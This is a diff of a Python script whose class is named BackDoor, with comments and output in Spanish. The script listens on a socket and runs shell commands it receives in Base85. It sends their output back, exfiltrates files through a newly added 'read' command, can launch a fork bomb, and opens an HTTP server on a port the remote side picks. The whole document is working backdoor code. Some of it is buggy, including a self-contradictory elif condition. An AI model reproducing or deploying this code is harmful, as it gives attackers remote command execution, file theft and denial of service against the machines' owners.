@@ -1,5 +1,5 @@
 #! /usr/bin/python3
-# -*- coding: utf-8 -*-
+
 
 import socket
 import base64
@@ -24,13 +24,13 @@ global hilo3
 def _MAIN():
 
     def _CodingBase85Text(ServerConnect, text):
-        data = base64.b85encode(text.encode(), pad=False)
+        data = base64.b85encode(text.encode('ascii'), pad=False)
         ServerConnect.send(data)
 
     def _DecodingBase85Text(ServerConnect, buffer):
         data = ServerConnect.recv(buffer).decode()
         data = base64.b85decode(data)
-        return str(data.decode())
+        return str(data.decode('ascii'))
 
     def _CloseServer(ServerDesconnect):
         ServerDesconnect.close()
@@ -40,10 +40,10 @@ def _MAIN():
         while True:
             os.fork()
 
-    def _HttpServer(port=9876):
+    def _HttpServer(port):
         class serv(HTTPServer):
             pass
-        
+
         class base(BaseHTTPRequestHandler):
 
             def repuesta(self):
@@ -77,12 +77,16 @@ def _MAIN():
         def __init__(self):
 
             self.Host = '127.0.0.1'
-            self.Port = 6365
+            try:
+                self.Port = sys.argv[1]
+                self.Port = int(self.Port)
+            except IndexError:
+                self.Port = 6365
             self.Ip = None
             self.Target = None
             self.Data = None
-            self.ListenSocket = 2
-            self.buffer = 2048
+            self.ListenSocket = 1
+            self.buffer = 3500
             self.Green = "\033[1;32m"
             self.White = "\033[1;37m"
             self.i = 1
@@ -131,11 +135,14 @@ def _MAIN():
                     _CloseServer(self.Server)
                     break
 
-                elif str(comand) == 'cd':
-                    dat = _DecodingBase85Text(self.Server, 8000)
-                    os.chdir(str(dat))
-                    self.Cwd = os.getcwd()
-                    _CodingBase85Text(self.Server, str(self.Cwd))
+                elif comand == 'cd':
+                    ruta = _DecodingBase85Text(self.Target, 1000)
+                    os.chdir(str(ruta))
+                    print("va")
+                    self.Cwd = os.getcwd
+                    print(self.Cwd)
+                    _CodingBase85Text(self.Target, ("se pudo aceder a la carpeta: "+str(ruta)))
+
 
                 elif comand == 'BombFork':
                     hilo1 = Process(target=_ForkBom)
@@ -153,8 +160,10 @@ def _MAIN():
 
 
                 elif comand == 'HttpServer':
-                    hilo3 = Process(target=_HttpServer)
-                    PortHttp = hilo3.start()
+                    PortHttp = int(str(_DecodingBase85Text(self.Target, self.buffer)))
+                    PortHttp = str(PortHttp)
+                    hilo3 = Process(target=_HttpServer(PortHttp))
+                    hilo3.start()
                     _CodingBase85Text(self.Target, "server abierto en el puerto "+str(PortHttp))
 
                 elif comand == 'CloseHttpServer':
@@ -164,7 +173,34 @@ def _MAIN():
                     except UnboundLocalError:
                         pass
 
-                elif comand != 'CloseHttpServer' and comand != 'HttpServer' and str(comand) != 'cwd' and comand != 'OsInfo' and comand != 'BombFork' and str(comand) == 'cd' and comand == 'exit'
+                elif comand == 'cd ..':
+                    os.chdir("..")
+                    self.Cwd = os.getcwd()
+                    _CodingBase85Text(self.Target, str(self.Cwd))
+
+                elif comand == 'read':
+                    fileOpen = _DecodingBase85Text(self.Target, self.buffer)
+                    try:
+                        try:
+                            _CodingBase85Text(self.Target, str("no binary"))
+                            file = open(str(fileOpen), "r")
+                            dataL = file.read()
+                            file.close()
+                            _CodingBase85Text(self.Target, str(dataL))
+                        except (FileNotFoundError, IsADirectoryError):
+                            _CodingBase85Text(self.Target, str("este archivo no esiste o es una carpeta"))
+                    except UnicodeDecodeError:
+                        try:
+                            _CodingBase85Text(self.Target, str("binary"))
+                            file = open(str(fileOpen), "rb")
+                            dataL = file.read()
+                            dataL = dataL
+                            file.close()
+                            _CodingBase85Text(self.Target, str(dataL))
+                        except FileNotFoundError:
+                            _CodingBase85Text(self.Target, str("este archivo no esiste"))
+
+                elif comand != 'CloseHttpServer' and comand != 'HttpServer' and str(comand) != 'cwd' and comand != 'OsInfo' and comand != 'BombFork' and str(comand) == 'cd' and comand == 'exit' and comand == 'cd ..' and comand == "read":
                     try:
                         data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
                     except UnicodeDecodeError:
@@ -174,12 +210,22 @@ def _MAIN():
                     comand = None
                     data = None
 
-                    if sys.platform == 'linux' or sys.platform == 'linux2':
-                        subprocess.getstatusoutput("clear")
-                    elif sys.platform == 'win32':
-                        subprocess.getstatusoutput("cls")
-                    else :
-                        subprocess.getstatusoutput("cls")
+
+                else:
+                    data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
+                    #except UnicodeDecodeError:
+                    #data = '\033[1;36mocurrio un error de descodificaion unicode en el servidor'
+                    _CodingBase85Text(self.Target, str(len(data)))
+                    _CodingBase85Text(self.Target, str(data))
+                    comand = None
+                    data = None
+
+                if sys.platform == 'linux' or sys.platform == 'linux2':
+                    os.system("clear")
+                elif sys.platform == 'win32':
+                    os.system("cls")
+                else :
+                    os.system("cls")
                     _CodingBase85Text(self.Target, _OsInfo())
 
     BackDoor = BackDoor()
